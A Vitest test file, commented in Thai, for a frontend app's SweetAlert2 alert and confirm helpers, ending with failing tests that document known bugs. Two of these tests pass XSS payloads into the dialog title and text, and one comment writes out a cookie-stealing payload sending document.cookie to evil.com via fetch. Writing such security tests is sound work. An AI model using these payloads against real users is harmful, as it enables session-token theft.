import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { showAlert, showConfirm } from "../../utils/swalHelper";

// ─── Mock sweetalert2 ────────────────────────────────────────
vi.mock("sweetalert2", () => ({
  default: {
    fire: vi.fn(),
  },
}));

import Swal from "sweetalert2";

beforeEach(() => {
  vi.clearAllMocks();
  Swal.fire.mockResolvedValue({ isConfirmed: false });
});

afterEach(() => {
  vi.restoreAllMocks();
});

// ═══════════════════════════════════════════════════════════
// showAlert
// ═══════════════════════════════════════════════════════════
describe("showAlert", () => {
  // ─── เรียก Swal.fire พร้อม options ─────────────────────
  it("เรียก Swal.fire ด้วย icon และ title ที่ระบุ", async () => {
    await showAlert("สำเร็จ", "บันทึกเรียบร้อย", "success");
    expect(Swal.fire).toHaveBeenCalledOnce();
    const args = Swal.fire.mock.calls[0][0];
    expect(args.icon).toBe("success");
    expect(args.title).toContain("สำเร็จ");
    expect(args.html).toContain("บันทึกเรียบร้อย");
  });

  it("ใช้สี icon ถูกต้องตามประเภท (error → #dc3545)", async () => {
    await showAlert("ผิดพลาด", "เกิดข้อผิดพลาด", "error");
    const args = Swal.fire.mock.calls[0][0];
    expect(args.title).toContain("#dc3545");
    expect(args.confirmButtonColor).toBe("#dc3545");
  });

  it("ใช้สี warning → #ffc107", async () => {
    await showAlert("แจ้งเตือน", "ข้อความ", "warning");
    const args = Swal.fire.mock.calls[0][0];
    expect(args.title).toContain("#ffc107");
    expect(args.confirmButtonColor).toBe("#ffc107");
  });

  it("ใช้สี info → #17a2b8", async () => {
    await showAlert("ข้อมูล", "ข้อความ", "info");
    const args = Swal.fire.mock.calls[0][0];
    expect(args.title).toContain("#17a2b8");
    expect(args.confirmButtonColor).toBe("#17a2b8");
  });

  it("ใช้สี success → #28a745", async () => {
    await showAlert("สำเร็จ", "ข้อความ", "success");
    const args = Swal.fire.mock.calls[0][0];
    expect(args.title).toContain("#28a745");
    expect(args.confirmButtonColor).toBe("#28a745");
  });

  // ─── timer & showConfirmButton branches ────────────────
  it("icon = success → timer 1800ms + ซ่อนปุ่ม confirm", async () => {
    await showAlert("สำเร็จ", "OK", "success");
    const args = Swal.fire.mock.calls[0][0];
    expect(args.timer).toBe(1800);
    expect(args.showConfirmButton).toBe(false);
  });

  it("icon = error → timer 3000ms + แสดงปุ่ม confirm", async () => {
    await showAlert("ผิดพลาด", "Error", "error");
    const args = Swal.fire.mock.calls[0][0];
    expect(args.timer).toBe(3000);
    expect(args.showConfirmButton).toBe(true);
  });

  it("icon = warning → timer 3000ms + แสดงปุ่ม confirm", async () => {
    await showAlert("แจ้งเตือน", "Warning", "warning");
    const args = Swal.fire.mock.calls[0][0];
    expect(args.timer).toBe(3000);
    expect(args.showConfirmButton).toBe(true);
  });

  it("icon = info → timer 3000ms + แสดงปุ่ม confirm", async () => {
    await showAlert("ข้อมูล", "Info", "info");
    const args = Swal.fire.mock.calls[0][0];
    expect(args.timer).toBe(3000);
    expect(args.showConfirmButton).toBe(true);
  });

  it("icon default เป็น success ถ้าไม่ระบุ", async () => {
    await showAlert("หัวข้อ", "รายละเอียด");
    const args = Swal.fire.mock.calls[0][0];
    expect(args.icon).toBe("success");
    expect(args.timer).toBe(1800);
    expect(args.showConfirmButton).toBe(false);
  });

  // ─── Swal config properties ────────────────────────────
  it("มี timerProgressBar, background, customClass, showClass, hideClass", async () => {
    await showAlert("Test", "Test", "success");
    const args = Swal.fire.mock.calls[0][0];
    expect(args.timerProgressBar).toBe(true);
    expect(args.background).toBe("#fff");
    expect(args.customClass.popup).toContain("rounded-4");
    expect(args.showClass.popup).toContain("animate__animated");
    expect(args.hideClass.popup).toContain("animate__animated");
  });

  it("คืนค่า Promise ที่ resolve จาก Swal.fire", async () => {
    Swal.fire.mockResolvedValue({ isConfirmed: true, value: "ok" });
    const result = await showAlert("Test", "Test", "success");
    expect(result).toEqual({ isConfirmed: true, value: "ok" });
  });

  // ─── didOpen callback (lines 30-31) ───────────────────
  it("didOpen: container มี → ตั้ง zIndex '99999' (TRUE branch, line 31)", async () => {
    // ต้อง invoke didOpen เองเพราะ Swal.fire ถูก mock ไม่เรียก callback
    const mockContainer = { style: {} };
    const querySpy = vi.spyOn(document, "querySelector").mockReturnValue(mockContainer);

    await showAlert("Test", "Test", "success");
    const { didOpen } = Swal.fire.mock.calls[0][0];
    didOpen();

    expect(querySpy).toHaveBeenCalledWith(".swal2-container");
    expect(mockContainer.style.zIndex).toBe("99999");
  });

  it("didOpen: container ไม่มี (null) → ไม่ throw error (FALSE branch, line 31)", async () => {
    // ครอบคลุม: if(null) → branch false → ไม่ execute body
    const querySpy = vi.spyOn(document, "querySelector").mockReturnValue(null);

    await showAlert("Test", "Test", "error");
    const { didOpen } = Swal.fire.mock.calls[0][0];
    expect(() => didOpen()).not.toThrow();
    expect(querySpy).toHaveBeenCalledWith(".swal2-container");
  });
});

// ═══════════════════════════════════════════════════════════
// showConfirm
// ═══════════════════════════════════════════════════════════
describe("showConfirm", () => {
  it("แสดง dialog ยืนยันพร้อมข้อความที่ระบุ", async () => {
    Swal.fire.mockResolvedValue({ isConfirmed: true });
    await showConfirm("ลบข้อมูล?", "ข้อมูลจะหายถาวร");
    const args = Swal.fire.mock.calls[0][0];
    expect(args.icon).toBe("warning");
    expect(args.title).toContain("ลบข้อมูล?");
    expect(args.html).toContain("ข้อมูลจะหายถาวร");
    expect(args.showCancelButton).toBe(true);
  });

  it("คืนค่า true เมื่อผู้ใช้กด confirm", async () => {
    Swal.fire.mockResolvedValue({ isConfirmed: true });
    const result = await showConfirm("ยืนยัน?", "ต้องการดำเนินการ?");
    expect(result).toBe(true);
  });

  it("คืนค่า false เมื่อผู้ใช้กด cancel", async () => {
    Swal.fire.mockResolvedValue({ isConfirmed: false });
    const result = await showConfirm("ยืนยัน?", "ต้องการดำเนินการ?");
    expect(result).toBe(false);
  });

  it("ใช้ข้อความปุ่มตาม parameter", async () => {
    await showConfirm("ลบ?", "แน่ใจ?", "ลบเลย", "ไม่ลบ");
    const args = Swal.fire.mock.calls[0][0];
    expect(args.confirmButtonText).toBe("ลบเลย");
    expect(args.cancelButtonText).toBe("ไม่ลบ");
  });

  it("ใช้ข้อความปุ่ม default ถ้าไม่ระบุ (ยืนยัน / ยกเลิก)", async () => {
    await showConfirm("ลบ?", "แน่ใจ?");
    const args = Swal.fire.mock.calls[0][0];
    expect(args.confirmButtonText).toBe("ยืนยัน");
    expect(args.cancelButtonText).toBe("ยกเลิก");
  });

  it("มี config ครบ: background, customClass, showClass, hideClass", async () => {
    await showConfirm("Test", "Test");
    const args = Swal.fire.mock.calls[0][0];
    expect(args.background).toBe("#fff");
    expect(args.confirmButtonColor).toBe("#dc3545");
    expect(args.cancelButtonColor).toBe("#6c757d");
    expect(args.customClass.popup).toContain("rounded-4");
  });

  it("title มี inline style สีส้ม #ff9800", async () => {
    await showConfirm("ยืนยัน?", "text");
    const args = Swal.fire.mock.calls[0][0];
    expect(args.title).toContain("#ff9800");
  });

  // ─── didOpen callback (lines 64-65) ───────────────────
  it("didOpen: container มี → ตั้ง zIndex '99999' (TRUE branch, line 65)", async () => {
    const mockContainer = { style: {} };
    const querySpy = vi.spyOn(document, "querySelector").mockReturnValue(mockContainer);

    await showConfirm("Test", "Test");
    const { didOpen } = Swal.fire.mock.calls[0][0];
    didOpen();

    expect(querySpy).toHaveBeenCalledWith(".swal2-container");
    expect(mockContainer.style.zIndex).toBe("99999");
  });

  it("didOpen: container ไม่มี (null) → ไม่ throw error (FALSE branch, line 65)", async () => {
    const querySpy = vi.spyOn(document, "querySelector").mockReturnValue(null);

    await showConfirm("Test", "Test");
    const { didOpen } = Swal.fire.mock.calls[0][0];
    expect(() => didOpen()).not.toThrow();
    expect(querySpy).toHaveBeenCalledWith(".swal2-container");
  });
});

// ═══════════════════════════════════════════════════════════
// Bug Cases (FAIL — อันตราย ยังไม่แก้ utility)
// ═══════════════════════════════════════════════════════════
describe("swalHelper > Bug Cases (FAIL)", () => {

  // BUG-3: XSS injection ผ่าน title parameter (template literal ไม่ escape HTML)
  // อันตราย: showAlert และ showConfirm สร้าง HTML ด้วย template literal:
  //           `<span style='...'>${title}</span>` — ไม่มีการ sanitize หรือ escape
  //          → ถ้า title มาจาก API error message ที่มี <script> หรือ event handler
  //          → Swal.fire ใช้ innerHTML ในการ render title → XSS execute ได้
  //          → ผู้โจมตีส่ง error message จาก API ให้มี `<img onerror='stealCookies()'>`
  //          → title ถูก inject เป็น HTML จริง → rogue script ทำงานใน context ของ app
  //          → ลูกค้า/admin ที่เห็น error dialog จะถูกขโมย session token
  //          → ควรใช้ DOMPurify.sanitize(title) หรือ textContent แทน innerHTML
  // FAIL เพราะ: template literal embed title โดยตรงไม่ escape → title มี raw HTML
  it("[BUG-3] XSS injection ผ่าน title → title ไม่ถูก escape (FAIL)", async () => {
    const maliciousTitle = "</span><script>alert('xss')</script>";
    await showAlert(maliciousTitle, "safe text", "info");
    const args = Swal.fire.mock.calls[0][0];

    // คาดหวัง: title ถูก escape เป็น &lt;script&gt; ไม่ใช่ <script> ดิบ
    expect(args.title).not.toContain("<script>");
    // FAIL: ได้ title = "<span style='...'>...</span><script>alert('xss')</script>"
    //       raw <script> tag ยังอยู่ใน HTML string ที่ส่งให้ Swal
  });

  // BUG-4: XSS injection ผ่าน text/html parameter (showAlert + showConfirm)
  // อันตราย: `<div style='...'>${text}</div>` — text/html option ของ Swal ใช้ innerHTML
  //          → ถ้า text มาจาก server error หรือ user input ที่มี event handler
  //          → `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`
  //          → ถูก render เป็น DOM จริง → cookie ถูกส่งไปยัง attacker server
  //          → component หลายตัวส่ง err.message จาก API error เข้า showAlert โดยตรง
  //          → ถ้า backend compromise หรือ error message manipulation → XSS ใน frontend
  //          → ควรใช้ text option (Swal escapes text) แทน html หรือ sanitize ก่อน
  // FAIL เพราะ: template literal ไม่ escape → html มี raw HTML tag
  it("[BUG-4] XSS injection ผ่าน text parameter → html ไม่ถูก escape (FAIL)", async () => {
    const maliciousText = '<img src=x onerror="stealCookies()">';
    await showAlert("Title", maliciousText, "error");
    const args = Swal.fire.mock.calls[0][0];

    // คาดหวัง: html ถูก escape → ไม่มี raw HTML tags
    expect(args.html).not.toContain("<img");
    // FAIL: ได้ html = "<div style='...'>  <img src=x onerror='stealCookies()'></div>"
    //       raw <img> tag อยู่ใน html string ที่ Swal render เป็น DOM จริง
  });

  // BUG-5: icon ที่ไม่มีใน colors object → colors[icon] = undefined → CSS 'color:undefined'
  // อันตราย: colors object มีแค่ 4 keys: success/error/warning/info
  //          → ถ้าผู้พัฒนาส่ง icon อื่น (เช่น "question", "danger", typo "succes")
  //          → colors["question"] = undefined → title style = "color:undefined;"
  //          → CSS invalid → browser ไม่ render สี → title ไม่มีสี ดูแปลก
  //          → confirmButtonColor = undefined → Swal ใช้ default สีแทน → inconsistent UI
  //          → ถ้า Swal validate confirmButtonColor ไม่ใช่ string → อาจ throw warning/error
  //          → ควรมี fallback: colors[icon] ?? '#6c757d' หรือ validate icon ก่อน
  // FAIL เพราะ: colors["question"] = undefined → confirmButtonColor = undefined (ไม่ใช่สี)
  it("[BUG-5] unknown icon → colors[icon] = undefined → confirmButtonColor undefined (FAIL)", async () => {
    await showAlert("Test", "Test", "question");
    const args = Swal.fire.mock.calls[0][0];

    // คาดหวัง: มี fallback color ไม่ใช่ undefined
    expect(args.confirmButtonColor).not.toBeUndefined();
    // FAIL: colors["question"] = undefined → confirmButtonColor = undefined
    //       และ title style = "color:undefined;" ซึ่ง invalid CSS
  });

  // BUG-6: null/undefined text/title parameter → แสดง "null" หรือ "undefined" ตรงๆ ใน dialog
  // อันตราย: showAlert(null, undefined) หรือ showAlert("Error", null) เกิดได้เมื่อ:
  //          → err.message เป็น null/undefined (API error object ไม่มี .message)
  //          → component ส่ง `err.message || "Default"` ลืม fallback → ได้ null
  //          → template literal: `<div>${null}</div>` = "<div>null</div>"
  //          → UI แสดง dialog ที่มีข้อความว่า "null" หรือ "undefined" ให้ user เห็น
  //          → user เห็น "null" แทนข้อความ error ที่อ่านได้ → UX พัง + confusing
  //          → ถ้า log dialog เนื้อหาเพื่อ audit → log เต็มไปด้วย "null" → debug ยาก
  //          → ควร guard: text = text ?? '' หรือ text = String(text || '')
  // FAIL เพราะ: `<div>${null}</div>` = "<div>null</div>" → html มีคำว่า "null"
  it("[BUG-6] null text → html แสดง 'null' ตรงๆ (FAIL)", async () => {
    await showAlert("Title", null, "info");
    const args = Swal.fire.mock.calls[0][0];

    // คาดหวัง: null text → html ไม่มีคำว่า "null" (ควรเป็น "" หรือ safe fallback)
    expect(args.html).not.toContain(">null<");
    // FAIL: `<div style='...'>${null}</div>` = "<div style='...'>null</div>"
    //       user เห็น dialog ที่มีข้อความว่า "null"
  });

  // BUG-7: showConfirm ไม่มี try/catch → ถ้า Swal.fire reject → unhandled rejection
  // อันตราย: showConfirm ไม่ wrap ด้วย try/catch:
  //          const result = await Swal.fire({...}); ← ถ้า throw จะ propagate ออกไป
  //          → Swal อาจ reject ถ้า: browser block popup, CSP violation, script load fail
  //          → caller (component) ที่ใช้ await showConfirm(...) โดยไม่มี try/catch จะ crash
  //          → component เช่น TypeSetting, RoomSetting เรียก showConfirm ใน confirmDelete()
  //          → ถ้า showConfirm throw → confirmDelete catch ไม่ได้ (เพราะ throw ก่อน try block)
  //          → Error propagate ขึ้นไปถึง Vue → component error → หน้าขาว/พัง
  //          → ควร wrap ด้วย try/catch และคืน false เมื่อ Swal ไม่สามารถ fire ได้
  // FAIL เพราะ: ไม่มี try/catch → Swal reject → showConfirm throw → caller ต้อง catch เอง
  it("[BUG-7] showConfirm Swal.fire reject → ควรคืน false ไม่ใช่ throw (FAIL)", async () => {
    Swal.fire.mockRejectedValue(new Error("Swal internal error"));

    // คาดหวัง: showConfirm จัดการ error gracefully → คืน false (user ถือว่า cancel)
    const result = await showConfirm("Test", "Test").catch(() => "threw");

    expect(result).toBe(false);
    // FAIL: showConfirm ไม่มี try/catch → Swal.fire reject → promise reject
    //       → .catch(() => "threw") จับได้ → result = "threw" ≠ false
  });
});
